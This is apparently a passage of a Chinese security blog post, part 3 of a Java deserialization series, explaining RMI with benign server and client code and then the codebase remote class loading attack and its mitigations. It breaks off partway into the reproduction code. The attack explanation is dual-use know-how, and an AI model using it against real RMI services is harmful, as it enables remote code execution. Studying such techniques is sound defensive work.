@@ -1,0 +1,650 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Java反序列化漏洞系列-3 - Geekby&#39;s Blog</title><meta name="Description" content="反序列化涉及到的相关协议"><meta property="og:title" content="Java反序列化漏洞系列-3" />
+<meta property="og:description" content="反序列化涉及到的相关协议" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-29T17:52:00+08:00" />
+<meta property="article:modified_time" content="2021-08-30T11:16:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Java反序列化漏洞系列-3"/>
+<meta name="twitter:description" content="反序列化涉及到的相关协议"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/" /><link rel="prev" href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/" /><link rel="next" href="https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Java反序列化漏洞系列-3",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2021\/08\/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "代码审计","wordcount":  795 ,
+        "url": "https:\/\/www.geekby.site\/2021\/08\/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3\/","datePublished": "2021-08-29T17:52:00+08:00","dateModified": "2021-08-30T11:16:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "反序列化涉及到的相关协议"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Java反序列化漏洞系列-3</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw"></i>代码审计</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-29">2021-08-29</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 795 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-rmi">1 RMI</a>
+      <ul>
+        <li><a href="#11-rmi-原理">1.1 RMI 原理</a></li>
+        <li><a href="#12-模拟-java-rmi-利用过程">1.2 模拟 Java RMI 利用过程</a>
+          <ul>
+            <li><a href="#121-rmi-server">1.2.1 RMI Server</a></li>
+            <li><a href="#122-rmi-client">1.2.2 RMI Client</a></li>
+          </ul>
+        </li>
+        <li><a href="#13-攻击面">1.3 攻击面</a>
+          <ul>
+            <li><a href="#131-rmi-利用-codebase-执行任意代码">1.3.1 RMI 利用 codebase 执行任意代码</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#2-jndi">2 JNDI</a>
+      <ul>
+        <li><a href="#21-jndi-组成">2.1 JNDI 组成</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="反序列化攻击涉及到的相关协议">反序列化攻击涉及到的相关协议</h1>
+<blockquote>
+<p>RMI 和 JNDI 都是 Java 分布式中运用较多的技术，JRMP 远程消息交换协议，运行于 Java RMI 之下，是一种底层传输协议。</p>
+</blockquote>
+<p>如果拿 Web 应用来举例子，那么 RMI 就像是 HTTP 协议，JNDI 就像是 Apache HTTP Server，JRMP 则相当于 TCP 协议。HTTP 向后端请求文件，后端中间件实际上不止 Apache 一种，还可以是 IIS、Tomcat 等，而底层都是基于 TCP 协议来传输数据的。</p>
+<h2 id="1-rmi">1 RMI</h2>
+<h3 id="11-rmi-原理">1.1 RMI 原理</h3>
+<p>RMI 全称是 <code>Remote Method Invocation</code>，远程方法调用。其的⽬标和 RPC 类似的，是让某个 Java 虚拟机上的对象调用另一个 Java 虚拟机中对象上的方法。</p>
+<p>整个过程有三个组织参与：Client、Registry(注册中心)、Server。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108300915504.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108300915504.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108300915504.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108300915504.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108300915504.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108300915504.png-water_print" /></p>
+<div class="details admonition tips open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-pencil-alt fa-fw"></i><i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ol>
+<li>RMI的传输是基于反序列化的。</li>
+<li>对于任何一个以对象为参数的 RMI 接口，构建对象，使服务器端将其按任何一个存在于服务端 classpath 中的可序列化类来反序列化恢复对象。</li>
+</ol>
+</div>
+        </div>
+    </div>
+<p>RMI 涉及到参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的 serialVersionUID 字段要与服务器端保持一致。</p>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw"></i>问题<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><ul>
+<li>什么是 Stub？</li>
+</ul>
+<p>每个远程对象都包含一个代理对象 Stub，当运行在本地 Java 虚拟机上的程序调用运行在远程 Java 虚拟机上的对象方法时，它首先在本地创建该对象的代理对象 Stub，然后调用代理对象上匹配的方法。</p>
+<p>Stub 对象负责调用参数和返回值的流化(Serialization)、打包解包，以及网络层的通讯过程。</p>
+<ul>
+<li>什么是 Skeleton？</li>
+</ul>
+<p>每一个远程对象同时也包含一个 Skeleton 对象，Skeleton 运行在远程对象所在的虚拟机上，接受来自 stub 对象的调用。</p>
+</div>
+        </div>
+    </div>
+<p>RMI 中的基本操作：</p>
+<ul>
+<li>lookup</li>
+<li>bind</li>
+<li>unbind</li>
+<li>list</li>
+<li>rebind</li>
+</ul>
+<h3 id="12-模拟-java-rmi-利用过程">1.2 模拟 Java RMI 利用过程</h3>
+<h4 id="121-rmi-server">1.2.1 RMI Server</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.geekby.javarmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.Naming</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.server.UnicastRemoteObject</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RMIServer</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">interface</span> <span class="nc">IRemoteHelloWorld</span> <span class="kd">extends</span> <span class="n">Remote</span> <span class="o">{</span>
+        <span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">RemoteHelloWorld</span> <span class="kd">extends</span> <span class="n">UnicastRemoteObject</span> <span class="kd">implements</span> <span class="n">RMIServer</span><span class="o">.</span><span class="na">IRemoteHelloWorld</span> <span class="o">{</span>
+        <span class="kd">protected</span> <span class="nf">RemoteHelloWorld</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+            <span class="kd">super</span><span class="o">();</span>
+        <span class="o">}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="s">&#34;Hello World&#34;</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">start</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">RemoteHelloWorld</span> <span class="n">h</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RemoteHelloWorld</span><span class="o">();</span>
+      <span class="c1">// 创建并运行 RMI Registry
+</span><span class="c1"></span>        <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
+      <span class="c1">// 将 RemoteHelloWorld 对象绑定到 Hello 这个名字上
+</span><span class="c1"></span>        <span class="n">Naming</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="s">&#34;rmi://127.0.0.1:1099/Hello&#34;</span><span class="o">,</span> <span class="n">h</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">new</span> <span class="n">RMIServer</span><span class="o">().</span><span class="na">start</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>上面提到过，⼀个 RMI Server 分为三部分：</p>
+<ul>
+<li>⼀个继承了 <code>java.rmi.Remote</code> 的接口，其中定义要远程调⽤的函数，⽐如上面的 <code>hello()</code></li>
+<li>⼀个实现了此接⼝的类</li>
+<li>⼀个主类，⽤来创建 Registry，并将上面的类实例化后绑定到一个地址，即 Server。</li>
+</ul>
+<p>在上面的示例代码里，将 Registry 与 Server 合并到一起。</p>
+<p><code>Naming.bind</code> 的第一个参数是一个 URL，形如：<code>rmi://host:port/name</code> 。其中， host 和 port 就是 RMI Registry 的地址和端口，name 是远程对象的名字。</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>如果 RMI Registry 在本地运行，那么 host 和 port 是可以省略的，此时 host 默认是 localhost，port 默认是 1099。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">Naming</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;Hello&#34;</span><span class="o">,</span> <span class="n">newRemoteHelloWorld</span><span class="o">());</span>
+</code></pre></td></tr></table>
+</div>
+</div></div>
+        </div>
+    </div>
+<h4 id="122-rmi-client">1.2.2 RMI Client</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.geekby.javarmi</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.rmi.Naming</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">RMIClient</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">RMIServer</span><span class="o">.</span><span class="na">IRemoteHelloWorld</span> <span class="n">hello</span> <span class="o">=</span> <span class="o">(</span><span class="n">RMIServer</span><span class="o">.</span><span class="na">IRemoteHelloWorld</span><span class="o">)</span> <span class="n">Naming</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;rmi://127.0.0.1:1099/Hello&#34;</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">hello</span><span class="o">.</span><span class="na">hello</span><span class="o">();</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">ret</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>客户端使用 <code>Naming.lookup</code> 在 <code>Registry</code> 中寻找到名字是 Hello 的对象，后⾯的使⽤用就和在本地使用是一致的。</p>
+<p>虽然执⾏远程⽅法的时候代码是在远程服务器上执行的，但客户端还是需要知道有哪些⽅法，这时候接口的重要性就体现了，这也是为什么我们前面要继承 Remote 并将需要调⽤的方法写在接⼝ IRemoteHelloWorld 里，因为客户端也需要⽤到这个接⼝。</p>
+<p>通过 wireshark 抓包，观察通信过程：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301121624.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301121624.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301121624.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301121624.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301121624.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301121624.png-water_print" /></p>
+<p>整个过程进⾏了两次 TCP 握手，也就是实际建⽴了两次 TCP 连接。</p>
+<p>第⼀次建立 TCP 连接是客户端连接服务端的 1099 端⼝，⼆者进行协商后，客户端向服务端发送了⼀个 <code>Call</code> 消息，服务端回复了一个 <code>ReturnData</code> 消息，然后客户端新建了⼀个 TCP 连接，连到远端的 51388 端口。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301136646.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301136646.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301136646.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301136646.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301136646.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301136646.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301137769.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301137769.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301137769.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301137769.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301137769.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301137769.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301138158.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301138158.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301138158.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301138158.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301138158.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301138158.png-water_print" /></p>
+<p>整个过程，⾸先客户端连接 Registry，并在其中寻找 Name 是 Hello 的对象，这个对应数据流中的 <code>Call</code> 消息。然后，Registry 返回一个序列化的数据，就是找到的 <code>Name=Hello</code> 的对象，对应数据流中的 <code>ReturnData</code> 消息。客户端反序列化该对象，发现该对象是⼀个远程对象，地址在 <code>IP:port</code> ，于是再与这个 socket 地址建⽴ TCP 连接。在新的连接中，才是真正的执行远程⽅法，也就是 <code>hello()</code>。</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">RMI Registry 就像一个⽹关，其自身是不会执行远程方法的，但 RMI Server 可以在上⾯注册⼀个 Name 到对象的绑定关系。RMI Client 通过 Name 向 RMI Registry 查询，得到这个绑定关系，然后再连接 RMI Server。最后，远程方法实际上在 RMI Server 上调⽤。</div>
+        </div>
+    </div>
+<h3 id="13-攻击面">1.3 攻击面</h3>
+<p>当攻击者可以访问目标 RMI Registry 的时候，会有哪些安全问题呢?</p>
+<p>首先，RMI Registry 是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。可以尝试直接访问“后台”功能，比如修改远程服务器上 Hello 对应的对象，但是，Java 对远程访问 RMI Registry 做了限制，只有来源地址是 localhost 的时候，才能调用 rebind、 bind、unbind 等方法。</p>
+<p>不过，list 和 lookup 方法可以远程调用。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301525660.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301525660.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301525660.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301525660.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301525660.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202108301525660.png-water_print" /></p>
+<h4 id="131-rmi-利用-codebase-执行任意代码">1.3.1 RMI 利用 codebase 执行任意代码</h4>
+<p>曾经有段时间，Java 是可以运行在浏览器中的。在使用 Applet 的时候通常需要指定一个 codebase 属性，比如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">applet</span> <span class="na">code</span><span class="o">=</span><span class="s">&#34;HelloWorld.class&#34;</span> <span class="na">codebase</span><span class="o">=</span><span class="s">&#34;Applets&#34;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;800&#34;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;600&#34;</span><span class="p">&gt;</span> <span class="p">&lt;/</span><span class="nt">applet</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>除了Applet，RMI 中也存在远程加载的场景，也会涉及到 codebase。 codebase 是一个地址，告诉 Java 虚拟机该从哪个地方去搜索类。</p>
+<p>如果指定 <code>codebase=http://geekby.site/</code> ，然后加载 <code>org.example.Example</code> 类，则 Java 虚拟机会下载这个文件 <code>http://geekby.site/org/example/Example.class</code> ，并作为 Example 类的字节码。</p>
+<p>RMI 的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的 CLASSPATH 下寻找相对应的类；如果在本地没有找到这个类，就会去远程加载 codebase 中的类。</p>
+<p>如果 codebase 被控制，就可以加载恶意类。在 RMI 中，可以将 codebase 随着序列化数据一起传输的，服务器在接收到这个数据后就会去 CLASSPATH 和指定的 codebase 寻找类，由于 codebase 被控制导致任意命令执行漏洞。</p>
+<p>官方通过如下方式解决了该安全问题：</p>
+<ul>
+<li>安装并配置了 SecurityManager</li>
+<li>Java 版本低于 7u21、6u45，或者设置了<code>java.rmi.server.useCodebaseOnly</code></li>
+</ul>
+<p>官方将 <code>java.rmi.server.useCodebaseOnly</code> 的默认值由 <code>false</code> 改为了 <code>true</code> 。在  <code>java.rmi.server.useCodebaseOnly</code> 配置为 <code>true</code> 的情况下，Java 虚拟机将只信任预先配置好的 codebase ，不再支持从 RMI 请求中获取。</p>
+<p>通过创建 4 个文件，进行漏洞复现：</p>
+<p>ICalc.java</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.rmi.Remote</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.rmi.RemoteException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
+<span class="kd">public</span> <span class="kd">interface</span> <span class="nc">ICalc</span> <span class="kd">extends</span> <span class="n">Remote</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="n">Integer</span> <span class="nf">sum</span><span class="o">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">Integer</span><span class="o">&gt;</span> <span class="n">params</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Calc.java</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
